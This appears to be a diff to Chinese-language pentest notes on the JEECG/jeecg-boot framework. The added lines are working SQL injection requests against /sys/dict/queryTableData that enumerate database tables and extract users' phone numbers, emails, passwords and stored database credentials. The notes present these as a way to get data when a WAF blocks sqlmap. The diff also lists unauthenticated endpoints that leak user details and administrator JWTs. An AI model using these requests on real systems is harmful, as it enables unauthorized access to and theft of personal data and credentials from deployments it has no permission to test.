@@ -41,7 +41,7 @@ JEECG的默认登录账号密码如下：
 SQL注入：
 1）/sys/duplicate/check
 2）/sys/ng-alain/getDictItemsByTable/
-3）/sys/diet/query/TableData
+3）/sys/dict/queryTableData
 4）/jmreport/qurestSql
 
 RCE：
@@ -146,6 +146,7 @@ OSS存储数据列表：
 
 ^
 ## **漏洞**
+### **SQL注入**
 getDictItemsByTable注入分析：<https://xz.aliyun.com/t/13186?time__1311=GqmhkD8iGNDKKYK0%3DeG%3Dt0QqitoQymmD>
 ```
 sql注入账号密码查询。若报错可报项目路径
@@ -164,10 +165,24 @@ mysql.user
 ```
 /jeecg-boot/api/sys/dict/queryTableData?pageSize=10000&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA
 ```
+网上公开poc为
+
+GET /jeecg-boot/sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA
+
+
+GET /sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEM
+如果遇见waf无法sqlmap跑东西时可利用如下poc拿数据深入利用，可自行进行拓展
+
+| 查看用户手机 | /sys/dict/queryTableData?table=sys_user&pageSize=22&pageNo=1&text=username&code=phone |
+| 查看用户邮箱 | /sys/dict/queryTableData?table=sys_user&pageSize=220&pageNo=1&text=username&code=email |
+| 查看用户密码 | /sys/dict/queryTableData?table=sys_user&pageSize=220&pageNo=1&text=username&code=password|
+| 查看数据库地址 | sys/dict/queryTableData?table=jimu_report_data_source&pageSize=22&pageNo=1&text=db_username&code=d
+
+
 
 
 ^
-未授权泄露最近的请求路径
+### **未授权泄露最近的请求路径**
 ```
 /sys/user/querySysUser?username=admin 查询某个用手机号
 /jeecg-boot/actuator/httptrace/  可能获取到管理员jwt
